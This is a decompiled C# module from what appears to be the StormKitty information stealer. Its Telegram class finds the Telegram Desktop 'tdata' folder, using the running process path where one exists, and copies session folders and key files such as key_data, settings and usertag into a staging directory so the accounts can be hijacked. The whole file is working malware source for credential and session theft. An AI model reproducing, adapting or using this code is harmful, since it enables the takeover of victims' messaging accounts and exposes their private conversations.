using System;
using System.Diagnostics;
using System.IO;
using StormKitty;

namespace Stealer
{
	// Token: 0x0200001E RID: 30
	internal sealed class Telegram
	{
		// Token: 0x06000099 RID: 153 RVA: 0x00005E04 File Offset: 0x00004004
		private static string GetTdata()
		{
			string result = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\tdata";
			Process[] processesByName = Process.GetProcessesByName("Telegram");
			if (processesByName.Length == 0)
			{
				return result;
			}
			return Path.Combine(Path.GetDirectoryName(ProcessList.ProcessExecutablePath(processesByName[0])), "tdata");
		}

		// Token: 0x0600009A RID: 154 RVA: 0x00005E4C File Offset: 0x0000404C
		public static bool GetTelegramSessions(string sSaveDir)
		{
			string tdata = Telegram.GetTdata();
			bool result;
			try
			{
				if (!Directory.Exists(tdata))
				{
					result = false;
				}
				else
				{
					Directory.CreateDirectory(sSaveDir);
					string[] directories = Directory.GetDirectories(tdata);
					string[] files = Directory.GetFiles(tdata);
					foreach (string text in directories)
					{
						string name = new DirectoryInfo(text).Name;
						if (name.Length == 16)
						{
							string destFolder = Path.Combine(sSaveDir, name);
							Filemanager.CopyDirectory(text, destFolder);
						}
					}
					string[] array = files;
					for (int i = 0; i < array.Length; i++)
					{
						FileInfo fileInfo = new FileInfo(array[i]);
						string name2 = fileInfo.Name;
						string destFileName = Path.Combine(sSaveDir, name2);
						if (fileInfo.Length <= 5120L)
						{
							if (name2.EndsWith("s") && name2.Length == 17)
							{
								fileInfo.CopyTo(destFileName);
							}
							else if (name2.StartsWith("usertag") || name2.StartsWith("settings") || name2.StartsWith("key_data"))
							{
								fileInfo.CopyTo(destFileName);
							}
						}
					}
					Counter.Telegram = true;
					result = true;
				}
			}
			catch
			{
				result = false;
			}
			return result;
		}
	}
}
